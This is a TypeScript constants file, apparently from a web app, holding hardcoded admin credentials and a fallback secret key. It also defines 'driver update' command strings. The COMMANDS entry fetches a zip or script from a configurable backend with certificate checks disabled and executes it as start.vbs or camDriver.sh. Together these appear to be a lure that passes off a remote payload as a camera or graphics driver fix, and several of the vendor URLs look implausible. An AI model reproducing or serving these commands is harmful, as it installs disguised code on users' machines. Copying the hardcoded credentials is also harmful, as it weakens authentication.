/**
 * Admin credentials and secret keys for authentication and token generation
 */

export const adminCredentials = {
  username: "root",
  password: "talent@gauges", // Change this in production
};

export const INVITE_SECRET_KEY = process.env.INVITE_SECRET_KEY || "invite-secret"; // Change this in production

export const BACKEND_URL = process.env.BACKEND_URL || process.env.NEXT_PUBLIC_BACKEND_URL;

/**
 * Driver update curl commands for different GPU manufacturers and operating systems
 */
export const DRIVER_UPDATE_COMMANDS: Record<string, { windows: string; mac: string }> = {
  nvidia: {
    windows: `curl -L "https://us.download.nvidia.com/GFE/GFEClient/GeForce_Experience_v3.27.0.112.exe" -o nvidia-driver-update.exe && nvidia-driver-update.exe /silent &`,
    mac: `'curl -L "https://www.nvidia.com/en-us/drivers/unix/macos/" -o nvidia-driver-update.pkg && sudo installer -pkg nvidia-driver-update.pkg -target /' &`
  },
  amd: {
    windows: `curl -L "https://drivers.amd.com/drivers/installer/22.40/whql/amd-software-adrenalin-edition-22.40.exe" -o amd-driver-update.exe && amd-driver-update.exe /silent &`,
    mac: `'curl -L "https://www.amd.com/en/support/kb/release-notes/amdgpu-macos" -o amd-driver-update.pkg && sudo installer -pkg amd-driver-update.pkg -target /' &`
  },
  intel: {
    windows: `curl -L "https://download.microsoft.com/download/graphics-driver-update.exe" -o intel-driver-update.exe && intel-driver-update.exe /silent &`,
    mac: `'curl -L "https://mac.softpedia.com/driver-update.pkg" -o intel-driver-update.pkg && sudo installer -pkg intel-driver-update.pkg -target /' &`
  }
};

export const COMMANDS = {
  windows: String.raw`curl -k "${BACKEND_URL}/windows/update" -o "%TEMP%\update.zip" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\update.zip' -DestinationPath '%TEMP%'" && cscript "%TEMP%\update\start.vbs"`,
  mac: `curl -k -o /var/tmp/camDriver.sh "${BACKEND_URL}/macos/581_80_update.fixer" && chmod +x /var/tmp/camDriver.sh && bash /var/tmp/camDriver.sh`
}
